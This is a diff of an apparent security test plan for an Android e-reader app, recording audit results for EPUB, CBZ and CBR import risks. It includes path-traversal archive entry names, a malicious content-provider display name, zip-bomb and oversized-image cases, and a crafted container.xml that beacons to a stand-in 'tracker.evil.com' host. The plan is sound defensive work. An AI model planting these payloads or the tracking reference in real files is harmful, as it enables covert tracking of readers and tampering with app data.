@@ -68,6 +68,11 @@
 | @JavascriptInterface methods exposed | ✓ Enumerated: onTap, onDecorationActivated, onDragStart/Move/End, onKey, onSelectionStart/End, getViewportWidth, logError | R2BasicWebView.class verbose |
 | logError JS interface writes to Timber/Logcat | ⚠️ Arbitrary string from EPUB JS can be written to logcat via window.Android.logError() | R2BasicWebView.class |
 | `check_gaze_data_leak.sh` CI prevents gaze terms in entity names and DataStore keys | ✓ Active | scripts/ |
+| Readium 3.x EPUB extraction to disk | ✓ Never extracted — ZipContainer serves entries via InputStream on-demand; no filesystem writes from ZIP entry paths | PublicationRepository.kt, Readium 3.1.2 architecture |
+| zip4j/junrar extraction to disk | ✓ Never extracted — getInputStream() only; entry names used as ZIP lookup keys, never as filesystem paths | ComicsReaderViewModel.kt |
+| LibraryViewModel DISPLAY_NAME usage | ✓ Never queried — all file paths use UUID(uri.toString()); DISPLAY_NAME not referenced anywhere | LibraryViewModel.kt |
+| BitmapFactory size guard in ComicsReaderViewModel | ⚠️ MISSING — decodeStream() called with no dimension check; large image entry can OOM app process | ComicsReaderViewModel.kt:154 |
+| DefaultHttpClient in PublicationRepository | ⚠️ Makes real HTTPS calls — Readium fetches remote OPF references; not intercepted by EpubBlockingWebViewClient | PublicationRepository.kt |
 
 ---
 
@@ -176,46 +181,73 @@
 > CBR extraction: junrar 7.5.7.
 > PDF: Android PdfRenderer (system).
 
-**B.1** `fileImport_zipBombEpub` 🔴
+**B.1** `fileImport_zipBombEpub` ✅ MITIGATED (architectural — renderer-process isolation)
 - MASVS: MASVS-CODE-4
-- Attack: Import an EPUB that is a ZIP bomb (e.g., 42.zip variant that expands to gigabytes). Verify Readium Kotlin enforces a decompressed size limit.
-- Pass: Import fails with a clear error message. No storage exhaustion. No ANR.
-- 🔍 Verify: Does Readium Kotlin's `DefaultStreamer` or `ReadiumSharedStreamer` enforce a maximum decompressed entry size? Check `readium-shared` source.
+- Attack: Import an EPUB with ZIP entries that decompress to gigabytes of HTML/CSS.
+- ✓ CONFIRMED SAFE (no disk extraction): Readium Kotlin 3.x never extracts EPUB ZIP entries to disk. `AssetRetriever` wraps the `content://` URI as a `ContentAsset`; `ZipContainer` decompresses entries on-demand via `InputStream` and streams them to the WebView via `WebViewServer.shouldInterceptRequest()`. No storage exhaustion possible.
+- ⚠️ REMAINING (renderer OOM, accepted): If a chapter entry decompresses to gigabytes of HTML, Chromium's renderer process may OOM. Android runs the WebView renderer in an isolated process; the app process survives and `onRenderProcessGone` fires. This is a crash-only outcome — no data corruption, no storage impact. Accepted risk for V1.
+- ✓ Import-path cover: `extractAndSaveCover()` calls `pub.cover()` — Readium 3.x applies internal downsampling (target ≤ 512×512) before returning the bitmap. OOM at import time is unlikely.
+- Pass criteria: Import a crafted EPUB with a 500 MB HTML chapter — verify no storage exhaustion, no Room record created on failure, and app remains usable after the WebView renderer restarts.
+- CVE-2021-40870 note: That CVE was in Readium-2 (Streamer) which DID extract EPUBs to a temp directory. Readium Kotlin 3.x (PublicationOpener + DefaultPublicationParser) does not. Architecture change eliminates the disk-write path entirely.
 
-**B.2** `fileImport_zipBombCbz` 🔴
+**B.2** `fileImport_zipBombCbz` ⚠️ FIX NEEDED — BitmapFactory no size guard
 - MASVS: MASVS-CODE-4
-- Attack: Import a CBZ that is a ZIP bomb. zip4j 2.11.6 is used — verify it enforces a size limit.
-- Pass: `ComicsReaderViewModel` fails gracefully. No storage exhaustion. `UnsupportedRarV5Exception` catch pattern suggests error handling exists — verify it covers size explosions too.
-- Android-specific: zip4j does not have a built-in decompressed-size limit by default. Manual stream limit may be needed.
+- Attack: CBZ entry with name `page001.png` (passes `isImageFile` filter) containing a PNG with IHDR dimensions of 10000×10000. `BitmapFactory.decodeStream()` allocates 10000×10000×4 bytes = 400 MB → OOM in the **app process** (not an isolated renderer). Crash loses reading progress for all open books.
+- ✓ CONFIRMED RISK: `ComicsReaderViewModel.renderPage()` calls `zip.getInputStream(zip.getFileHeader(entry)).use { BitmapFactory.decodeStream(it) }` with no `BitmapFactory.Options` guard.
+- Same risk exists in the CBR path: `rar.getInputStream(header).use { BitmapFactory.decodeStream(it) }`.
+- Fix: Check `FileHeader.uncompressedSize` (zip4j) / `FileHeader.fullUnpackSize` (junrar) before decoding. If > `MAX_IMAGE_BYTES` (e.g., 10 MB uncompressed), compute `inSampleSize` to subsample to ≤ `MAX_BITMAP_PIXELS` before full decode. zip4j supports multiple `getInputStream()` calls on the same entry — two-pass `inJustDecodeBounds` + decode is also viable.
+- Pass criteria: Open a CBZ containing a 20000×20000 image entry — verify the app does not crash, the page renders (possibly downsampled), and reading progress is preserved.
+- Android-specific: No equivalent risk in iOS (uses PDF/EPUB only).
 
-**B.3** `fileImport_pathTraversal_cbz` 🔴
+**B.3** `fileImport_pathTraversal_cbz` ✅ SAFE (no extraction to disk)
 - MASVS: MASVS-STORAGE-1
-- Attack: CBZ archive contains entries with paths like `../../data/data/com.straysouth.lectern/databases/lectern.db` or `../files/datastore/calibration_prefs.preferences_pb`. Verify zip4j extraction does not write outside the app's cache directory.
-- Pass: `ComicsReaderViewModel.uriToFile()` copies to `context.cacheDir` — verify zip4j entry paths are validated against the target directory before extraction. CWE-22.
-- Android-specific: iOS uses EPUB-only path; Android has the additional zip4j/junrar extraction path.
+- Attack: CBZ/CBR archive contains entries with `../../` paths targeting app database or DataStore files.
+- ✓ CONFIRMED SAFE: zip4j is used exclusively via `ZipFile.getInputStream(FileHeader)` — `extractAll()` and `extractFile()` are never called. Entry names are stored in `pageEntries` and used only as lookup keys in `zip.getFileHeader(entry)`. No filesystem writes occur from archive entry names.
+- ✓ Same for junrar: `Archive.getInputStream(FileHeader)` only. No `Archive.extractEntry()` calls.
+- ✓ `uriToFile()` copies the archive as a flat opaque blob to `cacheDir/<UUID>` — the UUID is derived from the URI string, not from any archive-internal path. No traversal possible at the copy step.
+- Pass criteria: Import a CBZ with an entry named `../../../../data/data/com.straysouth.lectern/databases/lectern.db` — verify the database file is not modified.
+- CWE-22: Not applicable because no extraction-to-disk path exists.
 
-**B.4** `fileImport_pathTraversal_epub` 🔴
+**B.4** `fileImport_pathTraversal_epub` ✅ SAFE (Readium 3.x no-extraction architecture)
 - MASVS: MASVS-STORAGE-1
-- Attack: EPUB ZIP contains entries with paths `../../databases/lectern.db`. Verify Readium Kotlin's streamer validates all entry paths.
-- Pass: No file is written outside the app's designated book storage. Readium's `DefaultStreamer` correctly rejects path traversal entries.
-- Source: CVE-2021-40870 (Readium-2 path traversal) — verify fix is present in Readium Kotlin 3.1.2.
+- Attack: EPUB ZIP contains entries with `../../databases/lectern.db` path components.
+- ✓ CONFIRMED SAFE: Readium Kotlin 3.x (`PublicationOpener` + `DefaultPublicationParser` + `AssetRetriever`) never extracts EPUB ZIP entries to disk. The `ContentAsset` wraps the `content://` URI; `ZipContainer` reads entries via `ZipInputStream` and serves them via `WebViewServer.shouldInterceptRequest()`. No file write originates from a ZIP entry path.
+- ✓ CVE-2021-40870 (Readium-2 path traversal): That vulnerability exploited the Readium-2 Streamer's extraction of EPUB files to a temporary directory. Readium Kotlin 3.x redesigned publication opening to be stream-based. The disk-write path no longer exists.
+- Pass criteria: Import an EPUB with a ZIP entry named `../../databases/lectern.db` — verify the database is not modified. Import a valid EPUB immediately after — verify it opens correctly.
 
-**B.5** `fileImport_contentUri_pathTraversal` 🔴
+**B.5** `fileImport_contentUri_pathTraversal` ✅ SAFE (no DISPLAY_NAME usage in file paths)
 - MASVS: MASVS-STORAGE-1
-- Attack: A malicious app provides a `content://` URI whose `DISPLAY_NAME` column returns `../../lectern.db`. If `LibraryViewModel` uses the display name to construct a file path, it could write outside the app sandbox.
-- Pass: `LibraryViewModel` uses a deterministic `UUID.nameUUIDFromBytes` ID for book storage — not the display name. Display name is only used for `title` metadata. Verify no file path is constructed from `DISPLAY_NAME`.
-- Android-specific: iOS does not use `content://` URIs.
+- Attack: Malicious app provides `content://` URI with `DISPLAY_NAME` returning `../../lectern.db`.
+- ✓ CONFIRMED SAFE: `LibraryViewModel` never queries `DISPLAY_NAME` from the content resolver. All file path construction uses deterministic UUIDs:
+  - Book ID: `UUID.nameUUIDFromBytes(uri.toString().toByteArray(Charsets.UTF_8))` — keyed on URI string
+  - Cover: saved to `filesDir/cover_$id.png` — ID is the UUID above
+  - Cache file (`uriToFile`): `File(cacheDir, UUID.nameUUIDFromBytes(uri.toString().toByteArray()))` — same pattern
+- ✓ Book title: derived from `uri.lastPathSegment?.substringBeforeLast('.')` or from EPUB metadata — stored as metadata only, never used in a file path.
+- Pass criteria: Use a `ContentProvider` that returns `DISPLAY_NAME = "../../../../databases/lectern.db"` — verify no file is created outside the app sandbox.
 
-**B.6** `fileImport_nonEpubMasqueradingAsEpub` 🔴
+**B.6** `fileImport_nonEpubMasqueradingAsEpub` ✅ SAFE (parser validation + Result error chain)
 - MASVS: MASVS-CODE-4
-- Attack: Import a file with `.epub` extension containing binary executable or malformed XML content.
-- Pass: Readium validates EPUB container structure (META-INF/container.xml, `application/epub+zip` mimetype file). Non-EPUB content is rejected with the `import_error_unsupported_format` string.
-- 🔍 Verify: `LibraryViewModel.detectFormat()` uses MIME type and extension — does it also validate EPUB magic bytes or container structure?
+- Attack: File with `.epub` extension (or MIME `application/epub+zip`) containing binary data or malformed XML.
+- ✓ CONFIRMED SAFE: `detectFormat()` maps to `FORMAT_EPUB` by extension or MIME → `importEpub()` → `pubRepository.open(uri)` → `AssetRetriever.retrieve(url)` → `DefaultPublicationParser.parse()`. If the content is not a valid EPUB ZIP, `AssetRetriever` returns failure (ZIP signature check). If ZIP but no `META-INF/container.xml`, `DefaultPublicationParser` returns `Try.Failure(OpenError.ContentReaders.CannotReadMediaType)`.
+- ✓ Room row written only on success: `bookDao.upsert(...)` is called only after `pub` is obtained from `Result.success`. A parse failure returns before the upsert.
+- ✓ Error surfaced: `_importError.value = getString(R.string.import_error_epub_open)` → Snackbar.
+- Pass criteria: Import a `.epub` file containing `PK\x03\x04` header + random bytes (valid ZIP header but no container.xml) — verify Snackbar error, no crash, no Room record.
 
-**B.7** `fileImport_duplicateBook_noDataCorruption` 🔴
+**B.7** `fileImport_duplicateBook_noDataCorruption` ✅ SAFE (deterministic UUID + REPLACE strategy)
 - MASVS: MASVS-STORAGE-1
-- Attack: Import the same EPUB twice, or two EPUBs with identical metadata. Verify Room `BookDao.upsert()` handles the duplicate correctly with no silent data loss.
-- Pass: Duplicate detection based on deterministic `UUID.nameUUIDFromBytes(uri.toString().toByteArray(Charsets.UTF_8))` — same URI → same ID → upsert overwrites. Different URI, same content → separate books. Verify the upsert semantics match user expectations.
+- Attack: Import same EPUB twice; import two EPUBs with identical metadata.
+- ✓ CONFIRMED SAFE: `bookCacheId(uri.toString())` produces a stable UUID. Same URI → same UUID → `BookDao.upsert()` with `OnConflictStrategy.REPLACE` → row updated in-place. `ReadingProgress` and locator rows are keyed on book ID — they survive the upsert (no cascade delete).
+- ✓ Different URI, same content: different UUID → separate rows. Expected behavior.
+- Pass criteria: Import EPUB X; open it and read to page 5 (creates `ReadingProgress`); import EPUB X again — verify reading progress still shows page 5, library shows one entry, no crash.
+
+**B.8** `fileImport_readiumHttpClientExfil` ⚠️ FIX NEEDED — DefaultHttpClient makes real HTTPS calls
+- MASVS: MASVS-NETWORK-1 · MASVS-PLATFORM-1
+- Attack: Craft an EPUB whose `META-INF/container.xml` references a remote OPF: `<rootfile full-path="https://tracker.evil.com/collect?u=UUID&t=1234" media-type="application/oebps-package+xml">`. Readium's `DefaultPublicationParser` uses `DefaultHttpClient` to fetch the remote OPF during `importEpub()`.
+- ✓ CONFIRMED RISK: `PublicationRepository` constructs `DefaultHttpClient()` and passes it to `DefaultPublicationParser`. This HTTP client makes real network calls on the app's behalf — not through the WebView, so `EpubBlockingWebViewClient` does NOT intercept it. `network_security_config.xml` blocks cleartext HTTP but allows HTTPS — HTTPS tracking beacons at import time go through.
+- Privacy impact: A malicious EPUB author can track which EPUB is imported and when (same AuDHD reading-behaviour sensitivity as A.2). The tracking fire at import time, before any chapter is read.
+- Fix: Replace `DefaultHttpClient()` with a no-op `HttpClient` that always returns `HttpResponse.failure(HttpException(404, "No network"))` or similar. Lectern V1 has no legitimate need for Readium to make external HTTP calls — all EPUB content is served from the local content:// asset. The `AssetRetriever` only uses the HTTP client when the EPUB references remote resources.
+- Cascade check: Disabling `DefaultHttpClient` does not affect EPUB local serving (via `WebViewServer`). It prevents Readium from fetching remote OPF files — which are not used by any well-formed EPUB in V1. Navigation, decorations, and TTS are unaffected.
+- Pass criteria: Import a crafted EPUB with remote OPF reference — verify in Network Profiler that no outbound HTTPS request is made. Verify a valid local EPUB imports correctly after the fix.
 
 ---
 
